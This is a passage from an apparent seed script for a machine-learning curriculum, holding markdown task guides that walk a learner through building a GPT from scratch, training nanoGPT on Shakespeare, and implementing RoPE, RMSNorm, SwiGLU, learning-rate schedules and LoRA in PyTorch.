Character-level GPT that generates Shakespeare-like text.

## Key Sections (with timestamps)
1. **Bigram baseline** - Simplest language model
2. **Self-attention** - The core mechanism
3. **Multi-head attention** - Parallel attention
4. **Feedforward network** - Per-position MLP
5. **Residual connections** - Skip connections
6. **Layer normalization** - Stabilizes training
7. **Training loop** - Putting it all together

## How to Watch
- **Pause frequently** - Don't just watch, code along
- **Run the code** - Verify it works at each step
- **Experiment** - Try changing hyperparameters

## By The End You'll Have
\`\`\`python
model = GPT(vocab_size, n_embd, n_head, n_layer, block_size)
# ~300 lines of code you completely understand
\`\`\`

## Completion Criteria
- [ ] Coded along with entire video
- [ ] Model generates coherent Shakespeare
- [ ] Can explain each component's purpose`],

	['Clone nanoGPT repository',
	'Study the production-quality nanoGPT codebase (~300 lines).',
	`## Setup
\`\`\`bash
git clone https://github.com/karpathy/nanoGPT
cd nanoGPT
pip install torch numpy transformers datasets tiktoken wandb tqdm
\`\`\`

## File Structure
\`\`\`
nanoGPT/
├── model.py          # The GPT model (~300 lines) - STUDY THIS
├── train.py          # Training loop
├── sample.py         # Generation
├── config/           # Training configs
└── data/             # Dataset preparation
\`\`\`

## Study Order for model.py

### 1. GPTConfig Dataclass
\`\`\`python
@dataclass
class GPTConfig:
    block_size: int = 1024
    vocab_size: int = 50304
    n_layer: int = 12
    n_head: int = 12
    n_embd: int = 768
\`\`\`

### 2. CausalSelfAttention
The attention mechanism with causal masking.

### 3. MLP
The feedforward network (expand, activate, contract).

### 4. Block
Attention + FFN with residuals and layer norms.

### 5. GPT
Combines embeddings, blocks, and output projection.

## Trace Shapes
For config: n_embd=768, n_head=12, block_size=1024, batch=8

\`\`\`
Input:    (8, 1024)           # token indices
Embed:    (8, 1024, 768)      # after token + position embedding
Block:    (8, 1024, 768)      # after each block
Output:   (8, 1024, 50304)    # logits for each position
\`\`\`

## Completion Criteria
- [ ] Can trace tensor shapes through forward()
- [ ] Understand each class's responsibility
- [ ] Read the training loop in train.py`],

	['Train nanoGPT on Shakespeare',
	'Train a small GPT on character-level Shakespeare and generate samples.',
	`## Step 1: Prepare Data
\`\`\`bash
cd nanoGPT
python data/shakespeare_char/prepare.py
\`\`\`

This downloads Shakespeare and creates train.bin/val.bin.

## Step 2: Train
\`\`\`bash
python train.py config/train_shakespeare_char.py
\`\`\`

Takes 5-15 min on GPU. Watch the loss decrease in terminal.

## Step 3: Generate
\`\`\`bash
python sample.py --out_dir=out-shakespeare-char
\`\`\`

Read the generated text. It should sound vaguely Shakespearean.

## Experiments to Try

### Change Model Size
Edit config or pass flags:
\`\`\`bash
python train.py config/train_shakespeare_char.py \\
    --n_layer=4 --n_head=4 --n_embd=128
\`\`\`

### Compare Results
| Config | Params | Val Loss | Sample Quality |
|--------|--------|----------|----------------|
| Tiny   | ~1M    | ~1.5     | Okay           |
| Small  | ~10M   | ~1.2     | Good           |
| Medium | ~85M   | ~1.0     | Great          |

### Training Curves to Watch
- Loss should decrease smoothly
- val_loss should track train_loss (gap = overfitting)
- Lower learning rate if loss spikes

## Completion Criteria
- [ ] Successfully trained model
- [ ] Generated coherent text samples
- [ ] Experimented with different sizes`],

	['Add print statements for tensor shapes',
	'Instrument nanoGPT with shape prints to understand data flow.',
	`## Goal
Add prints throughout model.py to see tensor shapes during forward pass.

## Modifications to model.py

### In GPT.forward()
\`\`\`python
def forward(self, idx, targets=None):
    device = idx.device
    b, t = idx.size()
    print(f"Input: {idx.shape}")  # ADD THIS

    tok_emb = self.transformer.wte(idx)
    pos_emb = self.transformer.wpe(pos)
    x = self.transformer.drop(tok_emb + pos_emb)
    print(f"After embed: {x.shape}")  # ADD THIS

    for i, block in enumerate(self.transformer.h):
        x = block(x)
        print(f"After block {i}: {x.shape}")  # ADD THIS
\`\`\`

### In CausalSelfAttention.forward()
\`\`\`python
def forward(self, x):
    B, T, C = x.size()
    print(f"  Attention input: {x.shape}")

    q, k, v = self.c_attn(x).split(self.n_embd, dim=2)
    print(f"  Q: {q.shape}, K: {k.shape}, V: {v.shape}")

    # After reshape to heads
    k = k.view(B, T, self.n_head, C // self.n_head).transpose(1, 2)
    print(f"  K (after reshape): {k.shape}")  # (B, nh, T, hs)

    # Attention weights
    att = (q @ k.transpose(-2, -1)) * (1.0 / math.sqrt(k.size(-1)))
    print(f"  Attention weights: {att.shape}")  # (B, nh, T, T)
\`\`\`

## Run One Forward Pass
\`\`\`python
import torch
from model import GPT, GPTConfig

config = GPTConfig(n_layer=2, n_head=4, n_embd=64, block_size=32, vocab_size=100)
model = GPT(config)

x = torch.randint(0, 100, (2, 32))  # batch=2, seq=32
logits, _ = model(x)
\`\`\`

## Expected Shapes
\`\`\`
Input: torch.Size([2, 32])
After embed: torch.Size([2, 32, 64])
  Attention input: torch.Size([2, 32, 64])
  Q: torch.Size([2, 32, 64])
  K (after reshape): torch.Size([2, 4, 32, 16])
  Attention weights: torch.Size([2, 4, 32, 32])
After block 0: torch.Size([2, 32, 64])
After block 1: torch.Size([2, 32, 64])
\`\`\`

## Completion Criteria
- [ ] Added prints throughout model
- [ ] Verified shapes match expectations
- [ ] Understand each transformation`],

	['Implement multi-head attention from scratch',
	'Build multi-head attention in a new file without copying.',
	`## Requirements
New Python file. Only import torch.

## Implementation Guide

### Step 1: Single-Head Attention
\`\`\`python
import torch
import torch.nn as nn
import torch.nn.functional as F
import math

class SingleHeadAttention(nn.Module):
    def __init__(self, d_model, d_k):
        super().__init__()
        self.d_k = d_k
        self.W_q = nn.Linear(d_model, d_k, bias=False)
        self.W_k = nn.Linear(d_model, d_k, bias=False)
        self.W_v = nn.Linear(d_model, d_k, bias=False)

    def forward(self, x):
        # x: (B, T, d_model)
        Q = self.W_q(x)  # (B, T, d_k)
        K = self.W_k(x)  # (B, T, d_k)
        V = self.W_v(x)  # (B, T, d_k)

        # Attention scores
        scores = Q @ K.transpose(-2, -1) / math.sqrt(self.d_k)  # (B, T, T)
        weights = F.softmax(scores, dim=-1)  # (B, T, T)
        out = weights @ V  # (B, T, d_k)
        return out
\`\`\`

### Step 2: Add Causal Mask
\`\`\`python
# Create mask: can't attend to future positions
T = x.size(1)
mask = torch.tril(torch.ones(T, T)).view(1, T, T)
scores = scores.masked_fill(mask == 0, float('-inf'))
\`\`\`

### Step 3: Multi-Head Version
\`\`\`python
class MultiHeadAttention(nn.Module):
    def __init__(self, d_model, n_heads):
        super().__init__()
        assert d_model % n_heads == 0
        self.d_k = d_model // n_heads
        self.n_heads = n_heads

        self.W_qkv = nn.Linear(d_model, 3 * d_model, bias=False)
        self.W_o = nn.Linear(d_model, d_model, bias=False)

    def forward(self, x):
        B, T, C = x.size()

        # Project and split into Q, K, V
        qkv = self.W_qkv(x)  # (B, T, 3*C)
        Q, K, V = qkv.split(C, dim=-1)

        # Reshape for multi-head: (B, T, C) -> (B, nh, T, d_k)
        Q = Q.view(B, T, self.n_heads, self.d_k).transpose(1, 2)
        K = K.view(B, T, self.n_heads, self.d_k).transpose(1, 2)
        V = V.view(B, T, self.n_heads, self.d_k).transpose(1, 2)

        # Attention
        scores = Q @ K.transpose(-2, -1) / math.sqrt(self.d_k)  # (B, nh, T, T)

        # Causal mask
        mask = torch.tril(torch.ones(T, T, device=x.device))
        scores = scores.masked_fill(mask == 0, float('-inf'))

        weights = F.softmax(scores, dim=-1)
        out = weights @ V  # (B, nh, T, d_k)

        # Concat heads and project
        out = out.transpose(1, 2).contiguous().view(B, T, C)
        out = self.W_o(out)
        return out
\`\`\`

## Test Your Implementation
\`\`\`python
mha = MultiHeadAttention(d_model=64, n_heads=8)
x = torch.randn(2, 10, 64)
out = mha(x)
assert out.shape == (2, 10, 64)
print("Success!")
\`\`\`

## Completion Criteria
- [ ] Implemented from scratch
- [ ] Includes causal masking
- [ ] Test passes`],

	['Implement full transformer block',
	'Build a complete transformer block with attention, FFN, and residuals.',
	`## Architecture
\`\`\`
x ─┬─> LayerNorm ─> Attention ─> + ─┬─> LayerNorm ─> FFN ─> + ─> out
   └────────────────────────────────┘  └─────────────────────────┘
         residual 1                        residual 2
\`\`\`

## Implementation

### Layer Normalization
\`\`\`python
class LayerNorm(nn.Module):
    def __init__(self, d_model, eps=1e-6):
        super().__init__()
        self.weight = nn.Parameter(torch.ones(d_model))
        self.bias = nn.Parameter(torch.zeros(d_model))
        self.eps = eps

    def forward(self, x):
        mean = x.mean(-1, keepdim=True)
        var = x.var(-1, unbiased=False, keepdim=True)
        return self.weight * (x - mean) / torch.sqrt(var + self.eps) + self.bias
\`\`\`

### Feed-Forward Network
\`\`\`python
class FeedForward(nn.Module):
    def __init__(self, d_model, d_ff=None, dropout=0.1):
        super().__init__()
        d_ff = d_ff or 4 * d_model
        self.net = nn.Sequential(
            nn.Linear(d_model, d_ff),
            nn.GELU(),
            nn.Linear(d_ff, d_model),
            nn.Dropout(dropout),
        )

    def forward(self, x):
        return self.net(x)
\`\`\`

### Transformer Block (Pre-Norm Style)
\`\`\`python
class TransformerBlock(nn.Module):
    def __init__(self, d_model, n_heads, dropout=0.1):
        super().__init__()
        self.ln1 = LayerNorm(d_model)
        self.attn = MultiHeadAttention(d_model, n_heads)
        self.ln2 = LayerNorm(d_model)
        self.ffn = FeedForward(d_model)
        self.dropout = nn.Dropout(dropout)

    def forward(self, x):
        # Pre-norm: LayerNorm BEFORE attention/FFN
        x = x + self.dropout(self.attn(self.ln1(x)))
        x = x + self.dropout(self.ffn(self.ln2(x)))
        return x
\`\`\`

## Test
\`\`\`python
block = TransformerBlock(d_model=64, n_heads=8)
x = torch.randn(2, 10, 64)
out = block(x)
assert out.shape == x.shape
print("Success!")
\`\`\`

## Pre-Norm vs Post-Norm
- **Post-norm (original):** Norm after residual addition
- **Pre-norm (GPT-2+):** Norm before attention/FFN
- Pre-norm is more stable for deep networks

## Completion Criteria
- [ ] Implemented LayerNorm
- [ ] Implemented FeedForward with GELU
- [ ] Complete TransformerBlock works`],

	['Build complete GPT model from scratch',
	'Combine all components into a full GPT model with generation.',
	`## Full GPT Architecture
\`\`\`
tokens ─> Token Embed + Pos Embed ─> [Block × N] ─> LayerNorm ─> Linear ─> logits
\`\`\`

## Implementation

### GPT Model
\`\`\`python
class GPT(nn.Module):
    def __init__(self, vocab_size, d_model, n_heads, n_layers, max_seq_len, dropout=0.1):
        super().__init__()
        self.max_seq_len = max_seq_len

        # Embeddings
        self.tok_emb = nn.Embedding(vocab_size, d_model)
        self.pos_emb = nn.Embedding(max_seq_len, d_model)
        self.dropout = nn.Dropout(dropout)

        # Transformer blocks
        self.blocks = nn.ModuleList([
            TransformerBlock(d_model, n_heads, dropout)
            for _ in range(n_layers)
        ])

        # Output
        self.ln_f = LayerNorm(d_model)
        self.head = nn.Linear(d_model, vocab_size, bias=False)

        # Weight tying (optional but common)
        self.tok_emb.weight = self.head.weight

    def forward(self, idx, targets=None):
        B, T = idx.shape
        assert T <= self.max_seq_len

        # Embeddings
        tok_emb = self.tok_emb(idx)  # (B, T, d_model)
        pos = torch.arange(T, device=idx.device)
        pos_emb = self.pos_emb(pos)  # (T, d_model)
        x = self.dropout(tok_emb + pos_emb)

        # Transformer blocks
        for block in self.blocks:
            x = block(x)

        # Output projection
        x = self.ln_f(x)
        logits = self.head(x)  # (B, T, vocab_size)

        # Loss (optional)
        loss = None
        if targets is not None:
            loss = F.cross_entropy(
                logits.view(-1, logits.size(-1)),
                targets.view(-1)
            )

        return logits, loss
\`\`\`

### Generation Method
\`\`\`python
    @torch.no_grad()
    def generate(self, idx, max_new_tokens, temperature=1.0, top_k=None):
        for _ in range(max_new_tokens):
            # Crop to max_seq_len
            idx_cond = idx[:, -self.max_seq_len:]

            # Forward pass
            logits, _ = self(idx_cond)
            logits = logits[:, -1, :] / temperature  # (B, vocab_size)

            # Optional top-k sampling
            if top_k is not None:
                v, _ = torch.topk(logits, top_k)
                logits[logits < v[:, [-1]]] = float('-inf')

            # Sample
            probs = F.softmax(logits, dim=-1)
            idx_next = torch.multinomial(probs, num_samples=1)

            # Append
            idx = torch.cat([idx, idx_next], dim=1)

        return idx
\`\`\`

## Test
\`\`\`python
model = GPT(
    vocab_size=100,
    d_model=64,
    n_heads=4,
    n_layers=2,
    max_seq_len=32
)

x = torch.randint(0, 100, (2, 10))
logits, _ = model(x)
assert logits.shape == (2, 10, 100)

# Generate
generated = model.generate(x, max_new_tokens=20)
assert generated.shape == (2, 30)
print("Success!")
\`\`\`

## Completion Criteria
- [ ] Full GPT model implemented
- [ ] Forward pass computes loss
- [ ] Generate method works with temperature/top-k`],

	['Study RoPE positional embeddings',
	'Understand Rotary Position Embeddings used in Llama/Mistral.',
	`## What is RoPE?
Rotary Position Embedding - a modern alternative to learned position embeddings.

Used in: Llama, Llama 2, Mistral, and most modern LLMs.

## Key Idea
Instead of ADDING position information, ROTATE Q and K vectors based on position.

\`\`\`python
# Standard: x = tok_emb + pos_emb
# RoPE: Q, K are rotated based on position
\`\`\`

## Why RoPE?
1. **Relative positions:** Naturally encodes relative distances
2. **Extrapolation:** Better at longer sequences than seen in training
3. **Efficiency:** Applied after Q, K projection

## How It Works

### The Rotation
For each pair of dimensions (2i, 2i+1) in Q and K:
\`\`\`
[q_{2i}, q_{2i+1}] → rotate by angle θ_i × position
\`\`\`

### The Angles
\`\`\`python
# θ_i decreases with dimension
theta_i = 1 / (10000 ** (2i / d_model))

# Higher dimensions = slower rotation = lower frequency
# Lower dimensions = faster rotation = higher frequency
\`\`\`

## Implementation
\`\`\`python
def precompute_freqs_cis(dim, max_seq_len, theta=10000.0):
    freqs = 1.0 / (theta ** (torch.arange(0, dim, 2).float() / dim))
    t = torch.arange(max_seq_len)
    freqs = torch.outer(t, freqs)
    freqs_cis = torch.polar(torch.ones_like(freqs), freqs)  # complex
    return freqs_cis

def apply_rotary_emb(xq, xk, freqs_cis):
    # Reshape to complex
    xq_ = torch.view_as_complex(xq.reshape(*xq.shape[:-1], -1, 2))
    xk_ = torch.view_as_complex(xk.reshape(*xk.shape[:-1], -1, 2))

    # Apply rotation via complex multiplication
    xq_out = torch.view_as_real(xq_ * freqs_cis).flatten(-2)
    xk_out = torch.view_as_real(xk_ * freqs_cis).flatten(-2)
    return xq_out, xk_out
\`\`\`

## Resources
- Paper: https://arxiv.org/abs/2104.09864
- Blog: https://blog.eleuther.ai/rotary-embeddings/

## Completion Criteria
- [ ] Understand why rotation encodes position
- [ ] Know the frequency pattern across dimensions
- [ ] Can implement basic RoPE`],

	['Study and implement RMSNorm',
	'Implement Root Mean Square Normalization (faster than LayerNorm).',
	`## What is RMSNorm?
Simplified normalization used in Llama instead of LayerNorm.

## LayerNorm vs RMSNorm

### LayerNorm
\`\`\`python
mean = x.mean(dim=-1, keepdim=True)
var = x.var(dim=-1, keepdim=True)
x_norm = (x - mean) / sqrt(var + eps)
return weight * x_norm + bias
\`\`\`

### RMSNorm (Simpler)
\`\`\`python
rms = sqrt(mean(x^2) + eps)
x_norm = x / rms
return weight * x_norm
\`\`\`

Key differences:
- No mean subtraction
- No bias term
- Just divide by RMS

## Why RMSNorm?
1. **Faster:** Fewer operations
2. **Works just as well:** Empirically equivalent
3. **Simpler:** Fewer parameters

## Implementation
\`\`\`python
class RMSNorm(nn.Module):
    def __init__(self, dim, eps=1e-6):
        super().__init__()
        self.weight = nn.Parameter(torch.ones(dim))
        self.eps = eps

    def forward(self, x):
        # RMS = sqrt(mean(x^2))
        rms = torch.rsqrt(x.pow(2).mean(-1, keepdim=True) + self.eps)
        return self.weight * x * rms
\`\`\`

That's it! About 5 lines of actual logic.

## Test
\`\`\`python
rms_norm = RMSNorm(64)
x = torch.randn(2, 10, 64)
out = rms_norm(x)

# Verify output has unit RMS (approximately)
rms_out = out.pow(2).mean(-1).sqrt()
print(f"Output RMS: {rms_out.mean():.3f}")  # Should be close to 1
\`\`\`

## Completion Criteria
- [ ] Understand difference from LayerNorm
- [ ] Implemented RMSNorm
- [ ] Test passes`],

	['Implement SwiGLU activation',
	'Implement the gated activation function used in Llama/PaLM.',
	`## What is SwiGLU?
Swish-Gated Linear Unit - a gated activation function.

Used in: Llama, PaLM, Mistral

## Standard FFN vs SwiGLU FFN

### Standard (GPT-2)
\`\`\`python
# Two matrices
def ffn(x):
    x = linear1(x)       # d_model → 4*d_model
    x = gelu(x)
    x = linear2(x)       # 4*d_model → d_model
    return x
\`\`\`

### SwiGLU (Llama)
\`\`\`python
# THREE matrices
def ffn(x):
    gate = swish(W_gate(x))  # d_model → d_ff
    up = W_up(x)             # d_model → d_ff
    x = gate * up            # Element-wise product
    x = W_down(x)            # d_ff → d_model
    return x
\`\`\`

## Swish Activation
\`\`\`python
def swish(x):
    return x * torch.sigmoid(x)

# Also called SiLU (Sigmoid Linear Unit)
# In PyTorch: F.silu(x)
\`\`\`

## Implementation
\`\`\`python
class SwiGLU(nn.Module):
    def __init__(self, d_model, d_ff=None, bias=False):
        super().__init__()
        # d_ff is typically (8/3) * d_model to match param count
        d_ff = d_ff or int((8/3) * d_model)
        # Round to multiple of 256 for efficiency
        d_ff = 256 * ((d_ff + 255) // 256)

        self.w_gate = nn.Linear(d_model, d_ff, bias=bias)
        self.w_up = nn.Linear(d_model, d_ff, bias=bias)
        self.w_down = nn.Linear(d_ff, d_model, bias=bias)

    def forward(self, x):
        gate = F.silu(self.w_gate(x))  # Swish = SiLU
        up = self.w_up(x)
        return self.w_down(gate * up)
\`\`\`

## Why 8/3 for d_ff?
Standard FFN: 2 matrices of size (d, 4d) and (4d, d)
- Params: 2 × d × 4d = 8d²

SwiGLU: 3 matrices of size (d, d_ff), (d, d_ff), (d_ff, d)
- Params: 3 × d × d_ff

To match: 3 × d × d_ff = 8d² → d_ff = 8d/3

## Test
\`\`\`python
swiglu = SwiGLU(d_model=768)
x = torch.randn(2, 10, 768)
out = swiglu(x)
assert out.shape == x.shape

# Count parameters
params = sum(p.numel() for p in swiglu.parameters())
print(f"Parameters: {params:,}")  # ~4.7M for d=768
\`\`\`

## Completion Criteria
- [ ] Understand gating mechanism
- [ ] Implemented SwiGLU
- [ ] Understand the 8/3 ratio`]
];

transformerTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod2.lastInsertRowid, title, desc, details, i, now);
});

// Phase 3: Training & Fine-tuning
const aiMod3 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 3: Training & Fine-tuning',
	'Learn training dynamics and adaptation techniques (2 weeks)',
	3,
	now
);

const trainingTasks: [string, string, string][] = [
	['Experiment with learning rates',
	'Train nanoGPT with different learning rates and compare loss curves.',
	`## Experiment Setup
Train the same model with different learning rates:
- lr = 1e-2 (too high)
- lr = 1e-3 (typical for small models)
- lr = 1e-4 (typical for medium models)
- lr = 1e-5 (typical for large models)

## What to Observe

### Too High (1e-2)
\`\`\`
Step 0: loss = 4.5
Step 100: loss = 3.2
Step 200: loss = 5.8  ← Loss EXPLODES
Step 300: loss = NaN  ← Dead
\`\`\`

### Too Low (1e-5)
\`\`\`
Step 0: loss = 4.5
Step 1000: loss = 4.3
Step 5000: loss = 4.0  ← Very slow progress
\`\`\`

### Just Right (1e-3 or 1e-4)
\`\`\`
Step 0: loss = 4.5
Step 100: loss = 2.8
Step 500: loss = 1.8
Step 1000: loss = 1.2  ← Smooth decrease
\`\`\`

## Code
\`\`\`python
import matplotlib.pyplot as plt

lrs = [1e-2, 1e-3, 1e-4, 1e-5]
all_losses = {}

for lr in lrs:
    losses = train_with_lr(lr, steps=1000)
    all_losses[lr] = losses

# Plot comparison
for lr, losses in all_losses.items():
    plt.plot(losses, label=f'lr={lr}')
plt.legend()
plt.xlabel('Step')
plt.ylabel('Loss')
plt.savefig('lr_comparison.png')
\`\`\`

## Guidelines
| Model Size | Typical Learning Rate |
|------------|----------------------|
| < 100M     | 1e-3 to 6e-4        |
| 100M - 1B  | 3e-4 to 1e-4        |
| 1B - 10B   | 1e-4 to 3e-5        |
| > 10B      | 3e-5 to 1e-5        |

## Completion Criteria
- [ ] Trained with all 4 learning rates
- [ ] Created comparison plot
- [ ] Identified optimal lr for your model`],

	['Implement learning rate warmup',
	'Add warmup and cosine decay to your training loop.',
	`## Why Warmup?
Early in training:
- Gradients are noisy (random initialization)
- Large lr + noisy gradients = unstable updates
- Solution: start small, gradually increase

## The Schedule
\`\`\`
lr
│
│         ┌──────────────────────────────┐
│        /                                 \\
│       /                                   \\
│      /                                     \\
│     /                                       \\
│    /                                         \\
│   /                                           \\
│──/                                             \\──
└─────────────────────────────────────────────────── step
   warmup          cosine decay            min_lr
\`\`\`

## Implementation
\`\`\`python
def get_lr(step, warmup_steps, max_lr, min_lr, max_steps):
    # Warmup phase
    if step < warmup_steps:
        return max_lr * step / warmup_steps

    # Cosine decay phase
    progress = (step - warmup_steps) / (max_steps - warmup_steps)
    return min_lr + 0.5 * (max_lr - min_lr) * (1 + math.cos(math.pi * progress))

# Example usage
max_lr = 6e-4
min_lr = 6e-5
warmup_steps = 200  # ~2% of training
max_steps = 10000

for step in range(max_steps):
    lr = get_lr(step, warmup_steps, max_lr, min_lr, max_steps)
    for param_group in optimizer.param_groups:
        param_group['lr'] = lr
    # ... training step ...
\`\`\`

## Typical Values
- Warmup: 1-2% of total steps (e.g., 200 steps out of 10000)
- min_lr: 10% of max_lr
- For very large models: longer warmup (up to 5%)

## Test
\`\`\`python
# Visualize your schedule
lrs = [get_lr(s, 200, 6e-4, 6e-5, 10000) for s in range(10000)]
plt.plot(lrs)
plt.xlabel('Step')
plt.ylabel('Learning Rate')
plt.savefig('lr_schedule.png')
\`\`\`

## Completion Criteria
- [ ] Implemented lr schedule function
- [ ] Visualized the schedule
- [ ] Training is more stable with warmup`],

	['Add gradient clipping',
	'Implement gradient clipping to prevent exploding gradients.',
	`## The Problem
Without clipping, occasionally:
- A bad batch produces huge gradients
- Huge update ruins the model
- Loss spikes or goes to NaN

## The Solution
\`\`\`python
# After loss.backward(), before optimizer.step()
torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)
\`\`\`

This scales down all gradients if their total norm exceeds max_norm.

## Implementation
\`\`\`python
for step in range(max_steps):
    # Forward
    logits, loss = model(x, y)

    # Backward
    optimizer.zero_grad()
    loss.backward()

    # Clip gradients
    grad_norm = torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)

    # Log gradient norm to see when clipping happens
    if step % 100 == 0:
        print(f"Step {step}, grad_norm: {grad_norm:.2f}")

    # Update
    optimizer.step()
\`\`\`

## Experiment: Compare With and Without
\`\`\`python
# Train without clipping
losses_no_clip = train(clip_grad=False, steps=2000)

# Train with clipping
losses_with_clip = train(clip_grad=True, steps=2000)

# Plot comparison - with clipping should be smoother
plt.plot(losses_no_clip, alpha=0.5, label='No clipping')
plt.plot(losses_with_clip, alpha=0.5, label='With clipping')
plt.legend()
\`\`\`

## Typical Values
- max_norm = 1.0 (most common)
- max_norm = 0.5 (more aggressive)
- max_norm = 5.0 (less aggressive)

## What to Monitor
\`\`\`python
# Log when clipping activates
if grad_norm > 1.0:
    print(f"Gradient clipped! Original norm: {grad_norm:.2f}")
\`\`\`

If clipping constantly (every step), your lr might be too high.

## Completion Criteria
- [ ] Added gradient clipping to training loop
- [ ] Logging gradient norms
- [ ] Compared training stability with/without clipping`],

	['Study mixed precision training',
	'Learn how FP16 training saves memory and speeds up training.',
	`## What is Mixed Precision?
Use FP16 (half precision) for most operations, FP32 for critical ones.

## Benefits
- **2x memory savings:** FP16 = 2 bytes vs FP32 = 4 bytes
- **Faster compute:** Modern GPUs have FP16 tensor cores
- **Larger batches:** Memory savings → bigger batch size

## The Challenge
FP16 has limited range. Small gradients underflow to 0:
\`\`\`
FP32: 1e-38 to 3e38
FP16: 6e-5 to 6e4  ← Much smaller range!
\`\`\`

## The Solution: Loss Scaling
1. Multiply loss by a large number (e.g., 1024)
2. Gradients scale up proportionally (stay in FP16 range)
3. Unscale after backward before optimizer step

## PyTorch Implementation
\`\`\`python
from torch.cuda.amp import autocast, GradScaler

scaler = GradScaler()

for step in range(max_steps):
    optimizer.zero_grad()

    # Forward in FP16
    with autocast():
        logits, loss = model(x, y)

    # Backward (scaler handles loss scaling)
    scaler.scale(loss).backward()

    # Unscale and clip
    scaler.unscale_(optimizer)
    torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)

    # Step (skips if gradients have inf/nan)
    scaler.step(optimizer)
    scaler.update()
\`\`\`

## What autocast() Does
- MatMul: FP16 (fast)
- Softmax: FP32 (needs precision)
- LayerNorm: FP32 (needs precision)
- Loss: FP32 (accumulation)

PyTorch handles this automatically!

## Benchmark
\`\`\`python
import time

# Without AMP
start = time.time()
train(use_amp=False, steps=1000)
fp32_time = time.time() - start

# With AMP
start = time.time()
train(use_amp=True, steps=1000)
fp16_time = time.time() - start

print(f"FP32: {fp32_time:.1f}s")
print(f"FP16: {fp16_time:.1f}s")
print(f"Speedup: {fp32_time/fp16_time:.2f}x")
\`\`\`

Typical speedup: 1.5-2x on modern GPUs.

## Completion Criteria
- [ ] Understand why loss scaling is needed
- [ ] Implemented mixed precision training
- [ ] Measured speedup on your GPU`],

	['Read LoRA paper',
	'Study the Low-Rank Adaptation paper for efficient fine-tuning.',
	`## Paper
"LoRA: Low-Rank Adaptation of Large Language Models"
https://arxiv.org/abs/2106.09685

## The Key Idea
Instead of fine-tuning all weights:
1. Freeze the pretrained weights W
2. Add small trainable matrices A and B
3. New weight = W + BA

\`\`\`
W_new = W_frozen + B @ A
       (d×d)    (d×r)(r×d)

where r << d (rank is small, e.g., 8 or 16)
\`\`\`

## Why It Works
- Weight updates during fine-tuning have low "intrinsic rank"
- You can capture most of the adaptation with low-rank matrices
- Train ~0.1% of parameters, get ~100% of the quality

## The Math
\`\`\`
Original: h = Wx
LoRA:     h = Wx + BAx
             └───┘   └──┘
             frozen  trainable

Parameters:
- W: d × d = d² (frozen)
- B: d × r (trainable)
- A: r × d (trainable)
- Total trainable: 2 × d × r
- If d=4096, r=8: trainable = 65K vs frozen = 16M
\`\`\`

## Key Hyperparameters
- **r (rank):** 4, 8, 16, 32, 64. Higher = more capacity
- **alpha:** Scaling factor. Typically alpha=2×r or alpha=r
- **Which layers:** Usually attention Q, V. Sometimes all linear layers.

## Scaling
\`\`\`python
# The output is scaled by alpha/r
output = W @ x + (B @ A @ x) * (alpha / r)
\`\`\`

This keeps the learning dynamics stable as you change r.

## Initialization
- A: Random (Kaiming/Gaussian)
- B: Zeros
- Result: BA = 0 at start → model starts as original

## Focus On (in the paper)
- Section 4.1: Which layers to adapt
- Table 2: Rank vs quality tradeoffs
- Figure 2: The architecture diagram

## Completion Criteria
- [ ] Read sections 1-4 of the paper
- [ ] Understand the low-rank decomposition
- [ ] Know how alpha scaling works`],

	['Implement LoRA from scratch',
	'Build your own LoRA layer without using libraries.',
	`## Implementation

### Step 1: LoRA Linear Layer
\`\`\`python
import torch
import torch.nn as nn
import math

class LoRALinear(nn.Module):
    def __init__(self, original_linear, rank=8, alpha=16):
        super().__init__()

        self.original = original_linear
        self.rank = rank
        self.alpha = alpha
        self.scaling = alpha / rank

        in_features = original_linear.in_features
        out_features = original_linear.out_features

        # Freeze original weights
        self.original.weight.requires_grad = False
        if self.original.bias is not None:
            self.original.bias.requires_grad = False

        # LoRA matrices
        self.A = nn.Parameter(torch.empty(in_features, rank))
        self.B = nn.Parameter(torch.zeros(rank, out_features))

        # Initialize A with Kaiming
        nn.init.kaiming_uniform_(self.A, a=math.sqrt(5))

    def forward(self, x):
        # Original forward (frozen)
        original_out = self.original(x)

        # LoRA forward
        lora_out = (x @ self.A @ self.B) * self.scaling

        return original_out + lora_out
\`\`\`

### Step 2: Apply LoRA to a Model
\`\`\`python
def apply_lora(model, rank=8, alpha=16, target_modules=['q_proj', 'v_proj']):
    """Replace target linear layers with LoRA versions."""
    for name, module in model.named_modules():
        if isinstance(module, nn.Linear):
            # Check if this layer should get LoRA
            if any(target in name for target in target_modules):
                # Get parent module
                parent_name = '.'.join(name.split('.')[:-1])
                child_name = name.split('.')[-1]
                parent = model.get_submodule(parent_name) if parent_name else model

                # Replace with LoRA version
                lora_layer = LoRALinear(module, rank=rank, alpha=alpha)
                setattr(parent, child_name, lora_layer)
                print(f"Applied LoRA to {name}")

    return model
\`\`\`

### Step 3: Count Parameters
\`\`\`python
def count_parameters(model):
    trainable = sum(p.numel() for p in model.parameters() if p.requires_grad)
    total = sum(p.numel() for p in model.parameters())
    print(f"Trainable: {trainable:,} ({100*trainable/total:.2f}%)")
    print(f"Total: {total:,}")
\`\`\`

## Test
\`\`\`python
# Create a simple model
class SimpleModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.q_proj = nn.Linear(768, 768)
        self.v_proj = nn.Linear(768, 768)
        self.output = nn.Linear(768, 768)

model = SimpleModel()
count_parameters(model)  # All 1.7M trainable

apply_lora(model, rank=8)
count_parameters(model)  # Only ~25K trainable
\`\`\`

## Completion Criteria
- [ ] Implemented LoRALinear class
- [ ] Can apply LoRA to existing models
- [ ] Verified parameter count reduction`],

	['Fine-tune GPT-2 with your LoRA',
	'Apply your LoRA implementation to fine-tune GPT-2 on custom data.',
	`## Setup
\`\`\`python
from transformers import AutoModelForCausalLM, AutoTokenizer

model = AutoModelForCausalLM.from_pretrained("gpt2")
tokenizer = AutoTokenizer.from_pretrained("gpt2")
tokenizer.pad_token = tokenizer.eos_token
\`\`\`

## Apply LoRA
\`\`\`python
# GPT-2 attention layers are named differently
target_modules = ['c_attn']  # Combined Q, K, V projection

# Apply your LoRA implementation
apply_lora(model, rank=8, alpha=16, target_modules=target_modules)
count_parameters(model)  # Should be ~0.1-0.5% trainable
\`\`\`

## Prepare Data
\`\`\`python
# Example: Fine-tune on your own writing
texts = [
    "Your custom text here...",
    "More examples...",
]

# Or use a small dataset
from datasets import load_dataset
